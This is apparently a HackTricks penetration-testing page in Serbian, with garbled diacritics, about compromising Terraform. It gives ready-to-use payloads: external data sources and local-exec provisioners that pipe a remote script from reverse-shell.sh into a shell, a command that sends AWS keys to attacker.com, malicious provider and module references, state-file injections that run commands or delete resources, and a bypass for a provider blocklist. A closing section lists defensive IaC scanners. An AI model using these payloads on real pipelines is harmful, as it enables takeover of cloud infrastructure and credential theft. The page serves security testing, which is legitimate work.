# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

[Iz dokumenata:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform je **alat za infrastrukturu kao kod** koji vam omoguÄ‡ava da definiÅ¡ete **resurse u oblaku i lokalne resurse** u konfiguracionim datotekama koje su Äitljive za ljude, a koje moÅ¾ete verzionisati, ponovo koristiti i deliti. Zatim moÅ¾ete koristiti dosledan radni tok za obezbeÄ‘ivanje i upravljanje svim vaÅ¡im infrastrukturnim resursima tokom njihovog Å¾ivotnog ciklusa. Terraform moÅ¾e upravljati niskonivnim komponentama kao Å¡to su raÄunarstvo, skladiÅ¡tenje i mreÅ¾ni resursi, kao i visokolevelnim komponentama kao Å¡to su DNS unosi i SaaS funkcije.

#### Kako Terraform funkcioniÅ¡e?

Terraform kreira i upravlja resursima na platformama u oblaku i drugim uslugama putem njihovih interfejsa za programiranje aplikacija (API). Provajderi omoguÄ‡avaju Terraformu da radi sa praktiÄno bilo kojom platformom ili uslugom koja ima dostupan API.

![](<../images/image (177).png>)

HashiCorp i Terraform zajednica su veÄ‡ napisali **viÅ¡e od 1700 provajdera** za upravljanje hiljadama razliÄitih tipova resursa i usluga, a ovaj broj se nastavlja poveÄ‡avati. Sve javno dostupne provajdere moÅ¾ete pronaÄ‡i na [Terraform Registry](https://registry.terraform.io/), ukljuÄujuÄ‡i Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i mnoge druge.

Osnovni Terraform radni tok se sastoji od tri faze:

- **Pisanje:** DefiniÅ¡ete resurse, koji mogu biti rasporeÄ‘eni preko viÅ¡e provajdera i usluga u oblaku. Na primer, moÅ¾ete kreirati konfiguraciju za implementaciju aplikacije na virtuelnim maÅ¡inama u mreÅ¾i Virtuelne Privatne Oblasti (VPC) sa sigurnosnim grupama i balansirnikom optereÄ‡enja.
- **Planiranje:** Terraform kreira plan izvrÅ¡enja koji opisuje infrastrukturu koju Ä‡e kreirati, aÅ¾urirati ili uniÅ¡titi na osnovu postojeÄ‡e infrastrukture i vaÅ¡e konfiguracije.
- **Primena:** Nakon odobrenja, Terraform izvrÅ¡ava predloÅ¾ene operacije u ispravnom redosledu, poÅ¡tujuÄ‡i sve zavisnosti resursa. Na primer, ako aÅ¾urirate svojstva VPC-a i promenite broj virtuelnih maÅ¡ina u tom VPC-u, Terraform Ä‡e ponovo kreirati VPC pre nego Å¡to skalira virtuelne maÅ¡ine.

![](<../images/image (215).png>)

### Terraform laboratorija

Samo instalirajte terraform na vaÅ¡em raÄunaru.

Ovde imate [vodiÄ](https://learn.hashicorp.com/tutorials/terraform/install-cli) i ovde imate [najbolji naÄin za preuzimanje terraforma](https://www.terraform.io/downloads).

## RCE u Terraformu: trovanje konfiguracione datoteke

Terraform **nema platformu koja izlaÅ¾e veb stranicu ili mreÅ¾nu uslugu** koju moÅ¾emo enumerisati, stoga je jedini naÄin da kompromitujemo terraform **da moÅ¾emo dodati/izmeniti terraform konfiguracione datoteke** ili **da moÅ¾emo izmeniti terraform stanje datoteke** (vidi poglavlje ispod).

MeÄ‘utim, terraform je **veoma osetljiva komponenta** za kompromitovanje jer Ä‡e imati **privilegovan pristup** razliÄitim lokacijama kako bi mogao pravilno da funkcioniÅ¡e.

Glavni naÄin na koji napadaÄ moÅ¾e kompromitovati sistem na kojem se terraform izvrÅ¡ava je da **kompromituje repozitorijum koji Äuva terraform konfiguracije**, jer Ä‡e u nekom trenutku biti **interpretirane**.

U stvari, postoje reÅ¡enja koja **automatski izvrÅ¡avaju terraform plan/primenu nakon Å¡to je PR** kreiran, kao Å¡to je **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Ako ste u moguÄ‡nosti da kompromitujete terraform datoteku, postoje razliÄiti naÄini na koje moÅ¾ete izvrÅ¡iti RCE kada neko izvrÅ¡i `terraform plan` ili `terraform apply`.

### Terraform plan

Terraform plan je **najÄeÅ¡Ä‡e koriÅ¡Ä‡ena komanda** u terraformu i programeri/reÅ¡enja koja koriste terraform je stalno pozivaju, tako da je **najlakÅ¡i naÄin da dobijete RCE** da se pobrinete da otrovate terraform konfiguracionu datoteku koja Ä‡e izvrÅ¡iti proizvoljne komande u `terraform plan`.

**KoriÅ¡Ä‡enje spoljnog provajdera**

Terraform nudi [`external` provajder](https://registry.terraform.io/providers/hashicorp/external/latest/docs) koji pruÅ¾a naÄin za interakciju izmeÄ‘u Terraforma i spoljnjih programa. MoÅ¾ete koristiti `external` izvor podataka za izvrÅ¡avanje proizvoljnog koda tokom `plana`.

Umetanje u terraform konfiguracionu datoteku neÅ¡to poput sledeÄ‡eg Ä‡e izvrÅ¡iti rev shell kada se izvrÅ¡i `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**KoriÅ¡Ä‡enje prilagoÄ‘enog provajdera**

NapadaÄ bi mogao poslati [prilagoÄ‘enog provajdera](https://learn.hashicorp.com/tutorials/terraform/provider-setup) na [Terraform Registry](https://registry.terraform.io/) i zatim ga dodati u Terraform kod u funkcionalnoj grani ([primer odavde](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provajder se preuzima u `init` i izvrÅ¡iÄ‡e maliciozni kod kada se izvrÅ¡i `plan`.

MoÅ¾ete pronaÄ‡i primer na [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**KoriÅ¡Ä‡enje spoljnog reference**

Obe pomenute opcije su korisne, ali nisu baÅ¡ diskretne (druga je diskretnija, ali sloÅ¾enija od prve). Ovaj napad moÅ¾ete izvesti Äak i na **diskretniji naÄin**, prateÄ‡i ove sugestije:

- Umesto da direktno dodate rev shell u terraform datoteku, moÅ¾ete **uÄitati spoljnji resurs** koji sadrÅ¾i rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
MoÅ¾ete pronaÄ‡i rev shell kod na [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- U spoljnim resursima, koristite **ref** funkciju da sakrijete **terraform rev shell kod u grani** unutar repozitorijuma, neÅ¡to poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply Ä‡e biti izvrÅ¡en da primeni sve promene, takoÄ‘e ga moÅ¾ete zloupotrebiti da dobijete RCE injektovanjem **malicioznog Terraform fajla sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Samo treba da se pobrinete da neki payload poput sledeÄ‡ih zavrÅ¡i u `main.tf` fajlu:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sledite **preporukama iz prethodne tehnike** da izvrÅ¡ite ovaj napad na **diskretniji naÄin koristeÄ‡i spoljne reference**.

## Izvori tajni

MoÅ¾ete imati **tajne vrednosti koje koristi terraform izbaÄene** pokretanjem `terraform apply` dodavanjem neÄega poput:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Zloupotreba Terraform State Fajlova

U sluÄaju da imate pristup za pisanje nad terraform state fajlovima, ali ne moÅ¾ete da menjate terraform kod, [**ova istraÅ¾ivanja**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) nude neke zanimljive opcije za iskoriÅ¡Ä‡avanje fajla. ÄŒak i ako biste imali pristup za pisanje nad konfiguracionim fajlovima, koriÅ¡Ä‡enje vektora state fajlova je Äesto mnogo podlije, poÅ¡to ne ostavljate tragove u `git` istoriji.

### RCE u Terraform-u: trovanje konfiguracionog fajla

MoguÄ‡e je [napraviti prilagoÄ‘enog provajdera](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i jednostavno zameniti jednog od provajdera u terraform state fajlu za malicioznog ili dodati laÅ¾ni resurs koji se poziva na malicioznog provajdera.

Provajder [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) se oslanja na istraÅ¾ivanje i oruÅ¾ava ovaj princip. MoÅ¾ete dodati laÅ¾ni resurs i navesti proizvoljnu bash komandu koju Å¾elite da izvrÅ¡ite u atributu `command`. Kada se pokrene `terraform` run, ovo Ä‡e biti proÄitano i izvrÅ¡eno u koracima `terraform plan` i `terraform apply`. U sluÄaju koraka `terraform apply`, `terraform` Ä‡e obrisati laÅ¾ni resurs iz state fajla nakon izvrÅ¡avanja vaÅ¡e komande, ÄisteÄ‡i za sobom. ViÅ¡e informacija i potpuna demonstracija mogu se naÄ‡i u [GitHub repozitorijumu koji hostuje izvorni kod za ovog provajdera](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Da biste ga koristili direktno, jednostavno ukljuÄite sledeÄ‡e na bilo kojoj poziciji u `resources` nizu i prilagodite atribute `name` i `command`:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Zatim, Äim se izvrÅ¡i `terraform`, vaÅ¡ kod Ä‡e se pokrenuti.

### Brisanje resursa <a href="#deleting-resources" id="deleting-resources"></a>

Postoje 2 naÄina da se uniÅ¡te resursi:

1. **Umetnite resurs sa nasumiÄnim imenom u datoteku stanja koja pokazuje na pravi resurs koji treba uniÅ¡titi**

PoÅ¡to Ä‡e terraform videti da resurs ne bi trebao da postoji, uniÅ¡tiÄ‡e ga (prateÄ‡i pravi ID resursa koji je naznaÄen). Primer sa prethodne strane:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Izmenite resurs za brisanje na naÄin da nije moguÄ‡e aÅ¾urirati (tako da Ä‡e biti obrisan i ponovo kreiran)**

Za EC2 instancu, izmena tipa instance je dovoljna da terraform obriÅ¡e i ponovo je kreira.

### Zamenite crnu listu provajdera

U sluÄaju da naiÄ‘ete na situaciju gde je `hashicorp/external` stavljen na crnu listu, moÅ¾ete ponovo implementirati `external` provajder na sledeÄ‡i naÄin. Napomena: Koristimo fork external provajdera objavljen od strane https://registry.terraform.io/providers/nazarewk/external/latest. TakoÄ‘e moÅ¾ete objaviti svoj fork ili ponovnu implementaciju.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Tada moÅ¾ete koristiti `external` kao i obiÄno.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Automatski alati za reviziju

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk nudi sveobuhvatno reÅ¡enje za skeniranje Infrastructure as Code (IaC) koje otkriva ranjivosti i pogreÅ¡ne konfiguracije u Terraform, CloudFormation, Kubernetes i drugim IaC formatima.

- **Karakteristike:**
- Skeniranje u realnom vremenu za sigurnosne ranjivosti i probleme usklaÄ‘enosti.
- Integracija sa sistemima za kontrolu verzija (GitHub, GitLab, Bitbucket).
- Automatizovani zahtevi za ispravke.
- Detaljna preporuka za otklanjanje problema.
- **Prijavite se:** Kreirajte nalog na [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** je alat za statiÄku analizu koda za infrastrukturu kao kod (IaC) i takoÄ‘e alat za analizu sastava softvera (SCA) za slike i open source pakete.

Skeneruje cloud infrastrukturu koja je obezbeÄ‘ena koristeÄ‡i [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), ili [OpenTofu](https://opentofu.org/) i otkriva bezbednosne i usklaÄ‘enosti greÅ¡ke u konfiguraciji koristeÄ‡i skeniranje zasnovano na grafu.

Izvodi [Software Composition Analysis (SCA) skeniranje](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) koje je skeniranje open source paketa i slika za Common Vulnerabilities and Exposures (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` je lagan, bezbednosno orijentisan test okvir za terraform koji omoguÄ‡ava negativno testiranje za vaÅ¡u infrastrukturu kao kod.

- **compliance:** Osigurajte da implementirani kod prati bezbednosne standarde, vaÅ¡e sopstvene prilagoÄ‘ene standarde
- **behaviour driven development:** Imamo BDD za skoro sve, zaÅ¡to ne i za IaC?
- **portable:** samo ga instalirajte iz `pip` ili pokrenite putem `docker`. Pogledajte [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** validira vaÅ¡ kod pre nego Å¡to bude implementiran
- **easy to integrate:** moÅ¾e se pokrenuti u vaÅ¡em pipeline-u (ili u git hooks) kako bi se osiguralo da su sve implementacije validirane.
- **segregation of duty:** moÅ¾ete Äuvati svoje testove u razliÄitom repozitorijumu gde je odgovorna posebna ekipa.

> [!NOTE]
> NaÅ¾alost, ako kod koristi neke provajdere kojima nemate pristup, neÄ‡ete moÄ‡i da izvrÅ¡ite `terraform plan` i pokrenete ovaj alat.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec koristi statiÄku analizu vaÅ¡eg terraform koda da bi uoÄio potencijalne pogreÅ¡ne konfiguracije.

- â˜ï¸ Proverava pogreÅ¡ne konfiguracije kod svih glavnih (i nekih manjih) provajdera u oblaku
- â›” Stotine ugraÄ‘enih pravila
- ğŸª† Skenira module (lokalne i udaljene)
- â• Evaluira HCL izraze kao i literalne vrednosti
- â†ªï¸ Evaluira Terraform funkcije npr. `concat()`
- ğŸ”— Evaluira odnose izmeÄ‘u Terraform resursa
- ğŸ§° Kompatibilan sa Terraform CDK
- ğŸ™… Primena (i obogaÄ‡ivanje) korisniÄki definisanih Rego politika
- ğŸ“ƒ PodrÅ¾ava viÅ¡e formata izlaza: divno (podrazumevano), JSON, SARIF, CSV, CheckStyle, JUnit, tekst, Gif.
- ğŸ› ï¸ Konfigurisanje (putem CLI zastavica i/ili konfiguracione datoteke)
- âš¡ Veoma brzo, sposobno da brzo skenira ogromne repozitorijume
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

PronaÄ‘ite sigurnosne ranjivosti, probleme usklaÄ‘enosti i greÅ¡ke u konfiguraciji infrastrukture rano u razvoju vaÅ¡e infrastrukture kao koda uz **KICS** od Checkmarx.

**KICS** oznaÄava **K**eeping **I**nfrastructure as **C**ode **S**ecure, otvorenog je koda i neophodan je za svaki cloud native projekat.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Iz [**dokumentacije**](https://github.com/tenable/terrascan): Terrascan je statiÄki analizator koda za infrastrukturu kao kod. Terrascan vam omoguÄ‡ava:

- Besprekorno skeniranje infrastrukture kao koda za pogreÅ¡ne konfiguracije.
- PraÄ‡enje obezbeÄ‘ene cloud infrastrukture za promene konfiguracije koje uvode promene u posturi, i omoguÄ‡ava vraÄ‡anje na sigurnu posturu.
- Otkrivanje sigurnosnih ranjivosti i krÅ¡enja usklaÄ‘enosti.
- UblaÅ¾avanje rizika pre obezbeÄ‘ivanja cloud native infrastrukture.
- Nudi fleksibilnost za lokalno pokretanje ili integraciju sa vaÅ¡im CI\CD.
```bash
brew install terrascan
```
## Reference

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)

{{#include ../banners/hacktricks-training.md}}
